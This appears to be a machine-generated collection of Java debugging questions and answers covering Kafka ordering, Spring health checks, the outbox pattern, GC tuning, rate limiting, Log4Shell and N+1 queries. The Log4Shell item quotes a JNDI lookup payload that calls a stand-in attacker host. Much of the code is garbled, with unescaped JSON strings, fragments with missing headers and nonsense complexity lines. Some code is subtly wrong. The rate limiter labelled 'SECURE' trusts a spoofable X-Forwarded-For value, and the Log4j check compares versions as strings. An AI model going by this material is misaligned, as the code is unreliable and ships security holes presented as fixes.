        props.put(ProducerConfig.ENABLE_IDEMPOTENCE_CONFIG, true);
        props.put(ProducerConfig.MAX_IN_FLIGHT_REQUESTS_PER_CONNECTION, 1);  // strict ordering!
        // Note: ENABLE_IDEMPOTENCE allows 5 in-flight with ordering; MAX_IN_FLIGHT=1 is extra-strict
        return props;
    }

    // Consumer: assign specific partition for ordered consumption
    // consumer.assign(Collections.singleton(new TopicPartition("order-events", 0)));
    // single consumer per partition -> strictly ordered processing

    // If global ordering needed (rare):
    // Use single partition topic (limits throughput to 1 consumer)
    // Or use sequence numbers in message payload and sort at consumer
}
```

> **Time:** O(n) &nbsp; **Space:** O(keys)
---

```java
import org.springframework.boot.actuate.health.*;
import org.springframework.stereotype.Component;
import javax.sql.DataSource;
import java.sql.Connection;

// Enable health details:
// management.endpoint.health.show-details=always
// management.endpoints.web.exposure.include=health,info,metrics,env

// GET /actuator/health:
// {"status":"DOWN","components":{"db":{"status":"DOWN","details":{"error":"..."}}}}

@Component("database")
class DatabaseHealthIndicator implements HealthIndicator {
    private final DataSource dataSource;
    DatabaseHealthIndicator(DataSource ds) { this.dataSource=ds; }

    @Override public Health health() {
        try (Connection conn = dataSource.getConnection()) {
            conn.prepareStatement("SELECT 1").executeQuery();
            return Health.up()
                .withDetail("database","PostgreSQL")
                .withDetail("validationQuery","SELECT 1")
                .build();
        } catch (Exception e) {
            return Health.down()
                .withDetail("error", e.getMessage())
                .withDetail("action","Check DB connectivity and credentials")
                .build();
        }
    }
}

@Component("kafka")
class KafkaHealthIndicator implements HealthIndicator {
    @Override public Health health() {
        // Check Kafka connectivity
        try {
            // AdminClient.listTopics() -> if succeeds, Kafka is up
            return Health.up().withDetail("kafka","connected").build();
        } catch (Exception e) {
            return Health.down().withDetail("kafka",e.getMessage()).build();
        }
    }
}

// Custom readiness/liveness groups (Spring Boot 2.3+):
// management.endpoint.health.group.liveness.include=livenessState
// management.endpoint.health.group.readiness.include=readinessState,db,kafka
```

```java
// Blue-Green deployment: two identical environments; switch traffic between them

// Kubernetes service selector switching:
// Blue pods: labels: {app: order-service, version: blue}
// Green pods: labels: {app: order-service, version: green}

// Service targets blue:
// spec.selector: {app: order-service, version: blue}

// Switch to green:
// kubectl patch service order-service -p '{"spec":{"selector":{"version":"green"}}}'

// Validation before switch:
// 1. Check green pods are healthy
// kubectl get pods -l version=green -> all Running
// 2. Smoke test green environment (using port-forward or internal endpoint)
// kubectl port-forward svc/order-service-green 8080:8080
// curl http://localhost:8080/actuator/health
// 3. Run smoke tests against green
// 4. Switch traffic

class BlueGreenDeploymentVerifier {
    static boolean validateNewVersion(String healthUrl) {
        try {
            var conn = (java.net.HttpURLConnection) new java.net.URL(healthUrl).openConnection();
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            int code = conn.getResponseCode();
            if (code == 200) {
                System.out.println("Green version healthy: " + healthUrl);
                return true;
            }
            System.err.println("Green version unhealthy: HTTP " + code);
            return false;
        } catch (Exception e) {
            System.err.println("Cannot reach green version: " + e.getMessage());
            return false;
        }
    }

    static void executeSwitchover() {
        System.out.println("kubectl patch service order-service ...");
        System.out.println("Monitor error rate for 5 minutes post-switch");
        System.out.println("If errors spike: kubectl patch back to blue");
    }
}
```

> **Time:** O(1) &nbsp; **Space:** O(1)

### 1930. Outbox Pattern Debug
**ID:** `DBG-1930`

**Problem:** Outbox Pattern Debug.

**Example Input:** messages lost on service crash during transaction

**Example Output:** outbox ensures delivery; no lost events

**Explanation:** Transactional outbox: write event to DB atomically; relay polls and publishes to Kafka.

**Answer:**
```java
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;
import jakarta.persistence.*;
import java.time.Instant;

@Entity class OutboxEvent {
    @Id @GeneratedValue Long id;
    String aggregateId; String eventType; String payload;
    boolean published = false;
    Instant createdAt = Instant.now();
}
interface OutboxRepository extends org.springframework.data.jpa.repository.JpaRepository<OutboxEvent,Long> {
    java.util.List<OutboxEvent> findByPublishedFalseOrderByCreatedAt();
}

@Service
class OrderServiceWithOutbox {
    @Autowired OrderRepository orderRepo;
    @Autowired OutboxRepository outboxRepo;

    @Transactional  // ATOMIC: order + outbox event in same transaction
    public Order createOrder(String userId, double amount) {
        Order order = orderRepo.save(new Order(userId, amount, "CREATED"));

        // Write event to outbox in SAME transaction (not Kafka yet)
        OutboxEvent event = new OutboxEvent();
        event.aggregateId = order.getId().toString();
        event.eventType = "ORDER_CREATED";
        event.payload = "{"orderId":""+order.getId()+"","userId":""+userId+""}";
        outboxRepo.save(event);

        return order;  // if this commits, outbox also commits; if rolls back, both roll back
    }
}

@Service
class OutboxRelay {
    @Autowired OutboxRepository outboxRepo;
    // Run by KafkaTemplate or polling
    @org.springframework.scheduling.annotation.Scheduled(fixedDelay = 1000)
    @Transactional
    void relay() {
        outboxRepo.findByPublishedFalseOrderByCreatedAt().forEach(event -> {
            // publish to Kafka
            System.out.println("Publishing: " + event.eventType + " " + event.aggregateId);
            event.published = true;
            outboxRepo.save(event);
        });
    }
}
@Entity class Order { @Id @GeneratedValue Long id; String userId; double amount; String status; Order(){} Order(String u,double a,String s){userId=u;amount=a;status=s;} Long getId(){return id;} }
interface OrderRepository extends org.springframework.data.jpa.repository.JpaRepository<Order,Long>{}
```

> **Time:** O(1) &nbsp; **Space:** O(outbox)
---

### 1931. Slow Garbage Collection Debug
**ID:** `DBG-1931`

**Problem:** Slow Garbage Collection Debug.

**Example Input:** app STW every 5s for 500ms

**Example Output:** GC pauses below 100ms

**Explanation:** Enable GC logging; identify collection type; tune heap; switch to G1/ZGC.

**Answer:**
```java
// GC pause analysis:
// -Xlog:gc*:file=/tmp/gc.log:time,uptime -> Java 11+
// Parse log: look for "Pause Young (Normal)" or "Pause Full"
// Full GC pause = most dangerous (STW for entire heap)

// Common causes of full GC:
// 1. Metaspace overflow: -XX:MaxMetaspaceSize=256m (add this flag)
// 2. Explicit System.gc() calls: -XX:+DisableExplicitGC
// 3. Humongous allocations (objects > G1HeapRegionSize/2)
// 4. Promotion failure: old gen fills up faster than GC collects

// G1GC tuning (best for most apps):
// -XX:+UseG1GC
// -XX:MaxGCPauseMillis=100    -> target 100ms max pause
// -XX:G1HeapRegionSize=16m    -> larger regions reduce humongous allocations
// -XX:InitiatingHeapOccupancyPercent=40  -> start concurrent marking earlier
// -Xms4g -Xmx4g              -> fixed heap size prevents resizing pauses

// ZGC for ultra-low latency (Java 15+):
// -XX:+UseZGC
// ZGC: sub-ms pauses regardless of heap size; scales to terabytes

// GC metrics with Micrometer:
import io.micrometer.core.instrument.binder.jvm.JvmGcMetrics;
import io.micrometer.core.instrument.MeterRegistry;

class GCMetrics {
    static void register(MeterRegistry registry) {
        new JvmGcMetrics().bindTo(registry);
        // Prometheus: jvm_gc_pause_seconds_sum, jvm_gc_pause_seconds_count
        // Alert: jvm_gc_pause_seconds_sum rate increasing? -> investigate
    }
}

// Test GC with GCEasy (online) or GCViewer:
// Upload /tmp/gc.log -> see pause time distribution, throughput, total GC time
```

> **Time:** O(1) &nbsp; **Space:** O(heap)

```java
@Entity class Product {

}

interface ProductRepository extends JpaRepository<Product,Long> {

    List<Product> findByCategoryAndActiveTrue(String category);  // WHERE category=? AND active=true
```

### 1933. API Rate Limit Bypass Debug
**ID:** `DBG-1933`

**Problem:** API Rate Limit Bypass Debug.

**Example Input:** attacker bypasses rate limit

**Example Output:** IP rotation detected; rate limit fixed

**Explanation:** Apply rate limit by user token not just IP; check X-Forwarded-For handling.

**Answer:**
```java
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicInteger;
import org.springframework.web.filter.OncePerRequestFilter;
import jakarta.servlet.http.*;
import jakarta.servlet.*;
import java.io.IOException;

class SecureRateLimitFilter extends OncePerRequestFilter {
    private final Map<String, AtomicInteger> counters = new ConcurrentHashMap<>();
    private final int MAX_PER_MINUTE = 60;

    @Override
    protected void doFilterInternal(HttpServletRequest req, HttpServletResponse res,
                                     FilterChain chain) throws ServletException, IOException {
        String key = getRateLimitKey(req);
        AtomicInteger count = counters.computeIfAbsent(key, k -> new AtomicInteger(0));

        if (count.incrementAndGet() > MAX_PER_MINUTE) {
            res.setStatus(429);
            res.setHeader("Retry-After","60");
            res.setHeader("X-RateLimit-Limit", String.valueOf(MAX_PER_MINUTE));
            res.getWriter().write("{"error":"Rate limit exceeded"}");
            return;
        }
        chain.doFilter(req, res);
    }

    private String getRateLimitKey(HttpServletRequest req) {
        // SECURE: rate limit by authenticated user token (not IP)
        String authHeader = req.getHeader("Authorization");
        if (authHeader != null && authHeader.startsWith("Bearer ")) {
            return "user:" + authHeader.substring(7, Math.min(authHeader.length(), 23));  // use token prefix
        }
        // Fallback to IP (with proper X-Forwarded-For handling behind proxy)
        String xff = req.getHeader("X-Forwarded-For");
        if (xff != null) {
            // IMPORTANT: take the FIRST IP (client IP), not last (proxy IP)
            String clientIp = xff.split(",")[0].trim();
            // Validate it's a valid IP to prevent header injection
            if (clientIp.matches("^[\d.]{7,15}$")) return "ip:" + clientIp;
        }
        return "ip:" + req.getRemoteAddr();
    }
}
```

> **Time:** O(1) &nbsp; **Space:** O(users)
---

### 1934. Distributed Lock Debug
**ID:** `DBG-1934`

**Problem:** Distributed Lock Debug.

**Example Input:** same job runs on multiple instances

**Example Output:** single execution; distributed lock works

**Explanation:** Redis SETNX or Redisson RLock; @SchedulerLock from ShedLock; ensure lock release on crash.

**Answer:**
```java
import net.javacrumbs.shedlock.spring.annotation.EnableSchedulerLock;
import net.javacrumbs.shedlock.spring.annotation.SchedulerLock;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;

// ShedLock: ensures @Scheduled methods run on only one instance
// Dependency: shedlock-spring, shedlock-provider-jdbc-template

@Component
@EnableSchedulerLock(defaultLockAtMostFor = "PT10M")  // max lock duration: 10 min
class SingletonScheduler {
    @Scheduled(cron = "0 0 * * * *")  // every hour
    @SchedulerLock(name = "generateDailyReport",
                   lockAtLeastFor = "PT5M",   // hold lock for at least 5 min
                   lockAtMostFor  = "PT10M")  // release after 10 min even if crash
    public void generateDailyReport() {
        System.out.println("Running on only ONE instance: " + System.getenv("HOSTNAME"));
        // ... generate report
    }
}

// ShedLock DB table (auto-created or manually):
// CREATE TABLE shedlock(name VARCHAR(64) NOT NULL, lock_until TIMESTAMP NOT NULL,
//   locked_at TIMESTAMP NOT NULL, locked_by VARCHAR(255) NOT NULL, PRIMARY KEY (name));

// Alternative: Redisson distributed lock
// RLock lock = redisson.getLock("job:generateReport");
// if (lock.tryLock(0, 10, TimeUnit.MINUTES)) {
//     try { doWork(); } finally { lock.unlock(); }
// }

// Deadlock prevention: lock.tryLock with timeout (not lock.lock which waits forever)
// Crash recovery: lockAtMostFor releases stuck lock after timeout (ShedLock handles this)
```

> **Time:** O(1) &nbsp; **Space:** O(1)

### 1935. API Gateway Timeout Debug
**ID:** `DBG-1935`

**Problem:** API Gateway Timeout Debug.

**Example Output:** timeout configured correctly; routing fixed

**Explanation:** Gateway timeout < upstream timeout; check health routes; circuit breaker integration.

**Answer:**
```java
// Spring Cloud Gateway timeout configuration:
// spring:
//   cloud:
//     gateway:
//       httpclient:
//         connect-timeout: 2000    # 2s to establish connection
//         response-timeout: 10s    # 10s for full response
//       routes:
//         - id: order-service
//           uri: lb://order-service
//           predicates: [Path=/api/orders/**]
//           filters:
//             - name: CircuitBreaker
//               args: {name: orderCB, fallbackUri: forward:/fallback/orders}
//             - name: Retry
//               args: {retries: 3, statuses: SERVICE_UNAVAILABLE, methods: GET}
//             - name: RequestRateLimiter
//               args: {redis-rate-limiter.replenishRate: 100, redis-rate-limiter.burstCapacity: 200}

import org.springframework.cloud.gateway.filter.factory.RetryGatewayFilterFactory;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.cloud.gateway.route.RouteLocator;
import org.springframework.cloud.gateway.route.builder.RouteLocatorBuilder;

@Configuration
class GatewayConfig {
    @Bean RouteLocator routes(RouteLocatorBuilder b) {
        return b.routes()
            .route("order-service", r -> r
                .path("/api/orders/**")
                .filters(f -> f
                    .rewritePath("/api/orders/(?<segment>.*)", "/orders/${segment}")
                    .circuitBreaker(c -> c.setName("orderCB").setFallbackUri("forward:/fallback"))
                    .retry(config -> config.setRetries(2)
                        .setMethods(org.springframework.http.HttpMethod.GET)
                        .setStatuses(org.springframework.http.HttpStatus.SERVICE_UNAVAILABLE)))
                .uri("lb://order-service"))
            .build();
    }
}

// Fallback controller:

//     return ResponseEntity.status(503).body("{"error":"Service temporarily unavailable"}");
```

### 1936. Log4Shell Vulnerability Debug
**ID:** `DBG-1936`

**Problem:** Log4Shell Vulnerability Debug.

**Example Input:** vulnerable Log4j version detected; patch needed

**Example Output:** Log4j upgraded; JNDI lookup disabled

**Explanation:** Identify Log4j version; apply patch; disable JNDI; verify with safe test string.

**Answer:**
```java
// Log4Shell (CVE-2021-44228): critical RCE in Log4j 2.x (< 2.15.0)
// Attack: user-controlled input logged with ${jndi:ldap://evil.com/a} triggers LDAP lookup

// IMMEDIATE MITIGATIONS (in order of preference):

// 1. BEST: Upgrade to Log4j 2.17.1+ (fixed version)
// pom.xml:
// <dependency>
//   <groupId>org.apache.logging.log4j</groupId>
//   <artifactId>log4j-core</artifactId>
//   <version>2.17.1</version>  <!-- 2.16 disabled JNDI, 2.17 fixed infinite recursion -->
// </dependency>

// 2. JVM flag to disable JNDI lookup (Log4j 2.x):
// -Dlog4j2.formatMsgNoLookups=true

// 3. Set LOG4J_FORMAT_MSG_NO_LOOKUPS=true env var

// 4. Remove JndiLookup class from classpath:
// zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class

// Detect vulnerable version:
import java.util.jar.*;

class Log4ShellDetector {
    static void checkLog4jVersion(String jarPath) throws Exception {
        JarFile jar = new JarFile(jarPath);
        Manifest manifest = jar.getManifest();
        if (manifest != null) {
            String version = manifest.getMainAttributes().getValue("Implementation-Version");
            System.out.println("Log4j version: " + version);
            if (version != null && version.startsWith("2.") &&
                version.compareTo("2.17.1") < 0) {
                System.out.println("VULNERABLE! Upgrade immediately.");
            }
        }
        jar.close();
    }

    // Verify fix: this string should NOT trigger LDAP lookup after patching
    static void testFix() {
        org.apache.logging.log4j.LogManager.getLogger(Log4ShellDetector.class)
            .info("Test input: ${{jndi:ldap://127.0.0.1:1389/test}}");  // double-brace prevents interpolation
        System.out.println("If no LDAP connection attempt observed, JNDI lookup is disabled.");
    }
}
```

> **Time:** O(1) &nbsp; **Space:** O(1)

### 1937. N+1 Query Debug
**ID:** `DBG-1937`

**Problem:** N+1 Query Debug.

**Example Input:** 500 queries for 500-item list

**Example Output:** single query; N+1 eliminated

**Explanation:** Hibernate LAZY vs EAGER; @EntityGraph; JOIN FETCH; batch fetching; DTO projection.

**Answer:**
```java
import org.springframework.data.jpa.repository.*;
import org.springframework.data.domain.*;
import jakarta.persistence.*;
import java.util.List;

@Entity class OrderItem {
    @Id @GeneratedValue Long id;
    @ManyToOne(fetch = FetchType.LAZY) Order order;
    String productName; double price;
}

@Entity class Order {
    @Id @GeneratedValue Long id; String userId;
    @OneToMany(mappedBy="order", fetch=FetchType.LAZY)
    List<OrderItem> items;
    Long getId(){return id;}
}

interface OrderRepository extends JpaRepository<Order,Long> {
    // BAD: N+1 problem
    // findAll() -> 1 query for orders
    // Then for each order: order.getItems() -> 1 query per order = N+1 total!

    // FIX 1: JOIN FETCH in JPQL
    @Query("SELECT DISTINCT o FROM Order o JOIN FETCH o.items WHERE o.userId = :userId")
    List<Order> findByUserIdWithItems(@Param("userId") String userId);

    // FIX 2: @EntityGraph (no JPQL needed)
    @EntityGraph(attributePaths = {"items"})
    List<Order> findByUserId(String userId);

    // FIX 3: Batch fetching in properties
    // spring.jpa.properties.hibernate.default_batch_fetch_size=20
    // -> Hibernate fetches lazy associations in batches of 20, not 1-by-1

    // FIX 4: DTO Projection (most efficient, no entity overhead)
    @Query("SELECT new com.myapp.dto.OrderSummary(o.id, o.userId, COUNT(i)) " +
           "FROM Order o LEFT JOIN o.items i GROUP BY o.id, o.userId")
    List<OrderSummary> findOrderSummaries();
}

record OrderSummary(Long id, String userId, Long itemCount) {}
```

> **Time:** O(n) &nbsp; **Space:** O(n)

### 1938. Heap Dump Analysis Debug
**ID:** `DBG-1938`

**Problem:** Heap Dump Analysis Debug.

**Example Input:** OOM in production; heap dump captured

**Example Output:** largest retainer found; leak fixed

**Explanation:** Eclipse MAT: Leak Suspects, Dominator Tree, OQL; find retained heap; trace to GC root.

**Answer:**
```java
// Eclipse MAT workflow:
// 1. File -> Open Heap Dump -> heap.hprof
// 2. Run: "Leak Suspects Report" (automated)
// 3. Manual analysis:

// Dominator Tree: objects that directly retain the most memory
// Columns: Shallow Heap (object itself), Retained Heap (all objects it keeps alive)

// Histogram: by class, sorted by retained heap
// Common culprits: char[], byte[], HashMap$Entry[], LinkedList$Node

// OQL (Object Query Language) in MAT:
// SELECT * FROM java.util.HashMap WHERE size > 10000
// SELECT * FROM java.util.ArrayList WHERE size > 100000
// SELECT * FROM char[] WHERE toString().startsWith("SELECT")  (SQL strings in cache)

// Find GC roots retaining a specific object:
// Right-click object -> Path to GC Roots -> Exclude all phantom/soft/weak refs

// Programmatic heap analysis before OOM:
import java.lang.management.*;

class HeapHealthMonitor {
    static void logHeapStatus() {
        MemoryMXBean memBean = ManagementFactory.getMemoryMXBean();
        MemoryUsage heap = memBean.getHeapMemoryUsage();
        double usedPct = 100.0 * heap.getUsed() / heap.getMax();
        System.out.printf("Heap: %.1f%% used (%dMB / %dMB)%n",
            usedPct, heap.getUsed()/1024/1024, heap.getMax()/1024/1024);
        if (usedPct > 90) {
            System.err.println("ALERT: Heap >90% full - potential OOM imminent");
            // Trigger heap dump proactively
            // jcmd <PID> GC.heap_dump /tmp/proactive.hprof
        }
    }

    // Soft references: GC clears them before OOM -> useful for caches
    static java.lang.ref.SoftReference<byte[]> softCache;
    static void useSoftRefCache(byte[] data) {
        softCache = new java.lang.ref.SoftReference<>(data);  // GC can collect under memory pressure
    }
}
```

> **Time:** O(objects) &nbsp; **Space:** O(heap)

### 1939. Service Dependency Timeout Debug
**ID:** `DBG-1939`

**Problem:** Service Dependency Timeout Debug.

**Example Input:** one slow dependency freezes all threads

**Example Output:** timeout + bulkhead; service isolated

**Explanation:** Bulkhead pattern (thread isolation); separate thread pool per dependency; timeout each call.

**Answer:**
```java
import io.github.resilience4j.bulkhead.*;
import io.github.resilience4j.timelimiter.*;
import org.springframework.stereotype.Service;
import java.util.concurrent.*;

@Service
class PaymentServiceClient {
    private final BulkheadRegistry bulkheadRegistry;
    private final TimeLimiterRegistry timeLimiterRegistry;
    private final ExecutorService pool = Executors.newFixedThreadPool(10);

    PaymentServiceClient(BulkheadRegistry br, TimeLimiterRegistry tr) {
        bulkheadRegistry=br; timeLimiterRegistry=tr;
    }

    String charge(String orderId, double amount) {
        // Bulkhead: limit concurrent calls to payment service (isolation)
        Bulkhead bulkhead = bulkheadRegistry.bulkhead("payment",
            BulkheadConfig.custom().maxConcurrentCalls(20).maxWaitDuration(java.time.Duration.ofMillis(500)).build());

        // TimeLimiter: fail fast if payment API is slow
        TimeLimiter timeLimiter = timeLimiterRegistry.timeLimiter("payment",
            TimeLimiterConfig.custom().timeoutDuration(java.time.Duration.ofSeconds(3)).build());

        try {
            Callable<String> call = Bulkhead.decorateCallable(bulkhead,
                () -> callPaymentAPI(orderId, amount));
            Future<String> future = pool.submit(call);
            return timeLimiter.executeFutureSupplier(() -> future);
        } catch (BulkheadFullException e) {
            return "PAYMENT_BUSY";  // fast fail, don't wait
        } catch (TimeoutException e) {
            return "PAYMENT_TIMEOUT";  // fast fail after 3s
        } catch (Exception e) {
            return "PAYMENT_ERROR";
        }
    }

    String callPaymentAPI(String orderId, double amount) throws InterruptedException {
        Thread.sleep(100);  // simulated API call
        return "SUCCESS";
    }
}

// Configuration (application.yml):
// resilience4j.bulkhead.instances.payment:
//   maxConcurrentCalls: 20
//   maxWaitDuration: 500ms
// resilience4j.timelimiter.instances.payment:
//   timeoutDuration: 3s
//   cancelRunningFuture: true
```

> **Time:** O(1) &nbsp; **Space:** O(threads)
---

### 1940. Cache Penetration Debug
**ID:** `DBG-1940`

**Problem:** Cache Penetration Debug.

**Example Input:** missing keys bypass cache; DB overloaded

**Example Output:** null caching or Bloom filter prevents bypass

**Explanation:** Bloom filter rejects non-existent keys; cache null values with short TTL.

**Answer:**
```java
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

class CachePenetrationSolutions {
    // Problem: key "user:99999" doesn't exist in DB
    // Cache miss -> DB query -> no result -> next request also misses cache -> DB overload

    // SOLUTION 1: Cache null values (simplest fix)
    static final String NULL_VALUE = "__NULL__";
    static final Map<String, String> cache = new ConcurrentHashMap<>();

    static String getUserWithNullCache(String userId) {
        if (cache.containsKey(userId)) {
            String cached = cache.get(userId);
            return NULL_VALUE.equals(cached) ? null : cached;  // return null for missing
        }
        String fromDb = queryFromDb(userId);
        if (fromDb == null) {
            cache.put(userId, NULL_VALUE);  // cache null for 5min to prevent repeat DB hits
        } else {
            cache.put(userId, fromDb);
        }
        return fromDb;
    }

    // SOLUTION 2: Bloom Filter (memory-efficient; no DB query for definitely-absent keys)
    // Google Guava BloomFilter or Redisson RBloomFilter
    static com.google.common.hash.BloomFilter<String> bloomFilter =
        com.google.common.hash.BloomFilter.create(
            com.google.common.hash.Funnels.stringFunnel(java.nio.charset.StandardCharsets.UTF_8),
            10_000_000,  // expected insertions
            0.01);       // 1% false positive rate

    static String getUserWithBloom(String userId) {
        if (!bloomFilter.mightContain(userId)) {
            return null;  // definitely doesn't exist -> no DB query needed
        }
        // Might exist -> check cache then DB
        return getUserWithNullCache(userId);
    }

    // Initialize bloom filter on startup: load all valid user IDs into bloom filter
    static void initBloomFilter(Set<String> allUserIds) {
        allUserIds.forEach(bloomFilter::put);
    }

    static String queryFromDb(String userId) { return null; }
}
```

> **Time:** O(1) &nbsp; **Space:** O(bloomFilterSize)
---

### 1941. Idempotency Key Collision Debug
**ID:** `DBG-1941`

**Problem:** Idempotency Key Collision Debug.

**Example Input:** same idempotency key used by different users

**Example Output:** key scoped per user; collision impossible

**Explanation:** Namespace idempotency key with userId; validate user matches key on lookup.

**Answer:**
```java
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;

class SecureIdempotencyService {
    record IdempotencyRecord(String userId, String result, long createdAt) {}
    private final Map<String, IdempotencyRecord> store = new ConcurrentHashMap<>();

    String processPayment(String userId, String idempotencyKey, double amount) {
        // Namespace key by userId to prevent cross-user collision
        String scopedKey = userId + ":" + idempotencyKey;

        IdempotencyRecord existing = store.get(scopedKey);
        if (existing != null) {
            // Validate the key belongs to the same user (security check)
            if (!existing.userId().equals(userId)) {
                throw new SecurityException("Idempotency key belongs to different user");
            }
            System.out.println("Idempotency hit for user "+userId);
            return existing.result();
        }

        // Process and store result
        String result = chargePayment(userId, amount);
        store.put(scopedKey, new IdempotencyRecord(userId, result, System.currentTimeMillis()));
        return result;
    }

    String chargePayment(String userId, double amount) {
        return "TXN-" + UUID.randomUUID().toString().substring(0,8);
    }

    // Cleanup expired keys (TTL-based expiry)
    void cleanupExpired(long maxAgeMs) {
        long cutoff = System.currentTimeMillis() - maxAgeMs;
        store.entrySet().removeIf(e -> e.getValue().createdAt() < cutoff);
    }

    // Redis implementation: SET userId:idempotencyKey result NX EX 86400
    // NX: only set if not exists (atomic check-and-set)
    // EX 86400: expire after 24 hours
}
```

> **Time:** O(1) &nbsp; **Space:** O(keys)
---

### 1942. JVM Metaspace OOM Debug
**ID:** `DBG-1942`

**Problem:** JVM Metaspace OOM Debug.

**Example Input:** OutOfMemoryError: Metaspace; class loading issue

**Example Output:** Metaspace bounded; class leak fixed

**Explanation:** Metaspace stores class metadata; unlimited by default; set MaxMetaspaceSize; find class leak.

**Answer:**
```java
// Metaspace OOM symptoms:
// java.lang.OutOfMemoryError: Metaspace
// Usually caused by: class loader leak (common in app servers and dynamic code gen)

// Diagnosis:
// jcmd <PID> VM.native_memory detail -> shows Metaspace usage
// jmap -clstats <PID> -> class loader statistics (Java 8: permgen)
// jstat -gcmetacapacity <PID> 1000 -> Metaspace capacity over time

// Common causes:
// 1. JSP/Groovy/CGLIB generates new classes dynamically; old ClassLoaders not GC'd
// 2. Spring AOP creates CGLIB proxies (normally fine but can leak with hot reload)
// 3. Bytecode manipulation libraries (ASM, Javassist) generate classes in loops

// JVM flags:
// -XX:MaxMetaspaceSize=256m    -> cap Metaspace (OOM better than OOM from swap)
// -XX:MetaspaceSize=64m        -> initial size (avoids resizing)
// -XX:+CMSClassUnloadingEnabled (Java 8 with CMS) -> enable class unloading during GC

// Find class loader leak:
import java.lang.management.*;

class MetaspaceMonitor {
    static void checkMetaspace() {
        ManagementFactory.getMemoryPoolMXBeans().stream()
            .filter(pool -> pool.getName().toLowerCase().contains("metaspace"))
            .forEach(pool -> {
                MemoryUsage usage = pool.getUsage();
                System.out.printf("Metaspace: used=%dMB committed=%dMB max=%s%n",
                    usage.getUsed()/1024/1024, usage.getCommitted()/1024/1024,
                    usage.getMax() == -1 ? "unlimited" : usage.getMax()/1024/1024+"MB");
            });
    }

    // Class loader count (growing = potential leak)
    static void countClassLoaders() {
        long count = ManagementFactory.getClassLoadingMXBean().getLoadedClassCount();
        System.out.println("Loaded classes: " + count);
        // Watch this number: if growing without bound -> class loader leak
    }
}
```

> **Time:** O(classes) &nbsp; **Space:** O(metaspace)
---

### 1943. Database Connection URL Debug
**ID:** `DBG-1943`

**Problem:** Database Connection URL Debug.

**Example Input:** JDBC URL malformed; connection refused

**Example Output:** correct URL; connection established

**Explanation:** Validate JDBC URL format; check host/port/dbname; test with psql/mysql client.

**Answer:**
```java
import java.sql.*;
import com.zaxxer.hikari.*;

class JdbcConnectionDebug {
    // JDBC URL formats:
    // PostgreSQL: jdbc:postgresql://hostname:5432/dbname?sslmode=require
    // MySQL:      jdbc:mysql://hostname:3306/dbname?useSSL=true&serverTimezone=UTC
    // H2 (embedded): jdbc:h2:mem:testdb;DB_CLOSE_DELAY=-1;MODE=PostgreSQL
    // H2 (file):     jdbc:h2:file:/tmp/mydb;AUTO_SERVER=TRUE
    // Oracle:     jdbc:oracle:thin:@hostname:1521:SID
    // SQL Server: jdbc:sqlserver://hostname:1433;databaseName=mydb;encrypt=true

    static void testConnection(String url, String user, String pass) {
        System.out.println("Testing connection to: " + sanitizeUrl(url));
        try (Connection conn = DriverManager.getConnection(url, user, pass)) {
            System.out.println("Connected! DB: " + conn.getMetaData().getDatabaseProductName()
                + " v" + conn.getMetaData().getDatabaseProductVersion());
            try (ResultSet rs = conn.prepareStatement("SELECT 1 AS test").executeQuery()) {
                if (rs.next()) System.out.println("Query OK: " + rs.getInt("test"));
            }
        } catch (SQLTimeoutException e) {
            System.err.println("Connection timeout: is hostname/port reachable? " + e.getMessage());
        } catch (SQLException e) {
            System.err.println("SQL Error [" + e.getSQLState() + "]: " + e.getMessage());
            // 08001 = Cannot connect; 28000 = Auth failed; 42000 = Bad DB name
        }
    }

    static String sanitizeUrl(String url) {
        return url.replaceAll("password=[^&]+","password=****");  // never log passwords!
    }

    // HikariCP connection validation:
    static HikariDataSource buildDataSource(String url, String user, String pass) {
        HikariConfig cfg = new HikariConfig();
        cfg.setJdbcUrl(url); cfg.setUsername(user); cfg.setPassword(pass);
        cfg.setConnectionTestQuery("SELECT 1");      // validate connection before use
        cfg.setInitializationFailTimeout(30000);     // fail fast on startup if DB unreachable
        return new HikariDataSource(cfg);
    }

    public static void main(String[] args) {
        testConnection("jdbc:postgresql://localhost:5432/myapp", "app_user", "secret");
    }
}
```

> **Time:** O(1) &nbsp; **Space:** O(1)
---

**ID:** `DBG-1944`

**Example Output:** distributed trace captured; issue found

**Explanation:** Feature flags for debug logging; read-only live replay; shadow traffic; sampling.

**Answer:**
```java
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.slf4j.MDC;
import org.springframework.web.bind.annotation.*;

// Debugging production without impacting users:

// TECHNIQUE 1: Dynamic log level change (no restart)
// POST /actuator/loggers/com.myapp.order
// Body: {"configuredLevel": "DEBUG"}
// This enables DEBUG logging for specific package in production immediately!
// Change back: {"configuredLevel": "INFO"}

// TECHNIQUE 2: User-specific debug logging
@RestController
class OrderController {
    static final Logger log = LoggerFactory.getLogger(OrderController.class);
    // Feature flag: enable verbose logging for specific user
    static final java.util.Set<String> DEBUG_USERS = java.util.concurrent.ConcurrentHashMap.newKeySet();

    @PostMapping("/orders")
    String createOrder(@RequestHeader("X-User-Id") String userId, @RequestBody String body) {
        boolean debugMode = DEBUG_USERS.contains(userId);
        MDC.put("debug", String.valueOf(debugMode));

        if (debugMode) {
            log.debug("DEBUG[{}]: Request body: {}", userId, body);
        }

        // TECHNIQUE 3: Correlation ID for tracing specific requests
        String requestId = java.util.UUID.randomUUID().toString().substring(0,8);
        MDC.put("requestId", requestId);
        log.info("Processing order for user: {}", userId);

        return "{"orderId":"ORD-001","debugRequestId":"" + (debugMode ? requestId : "") + ""}";
    }

    @PostMapping("/admin/debug-user/{userId}")
    String enableDebug(@PathVariable String userId) {
        DEBUG_USERS.add(userId);
        log.info("Enabled debug mode for user: {}", userId);
        return "Debug enabled for user: " + userId;
    }
}
// TECHNIQUE 4: Shadow traffic (duplicate production traffic to staging)
// Istio traffic mirroring:
// spec.http[].mirror: {host: order-service-staging}
// spec.http[].mirrorPercentage.value: 10  -> shadow 10% of traffic
```

> **Time:** O(1) &nbsp; **Space:** O(1)

## System Design LLD


### 1945. Design Parking Lot
**ID:** `LLD-1945`

**Problem:** Design Parking Lot.

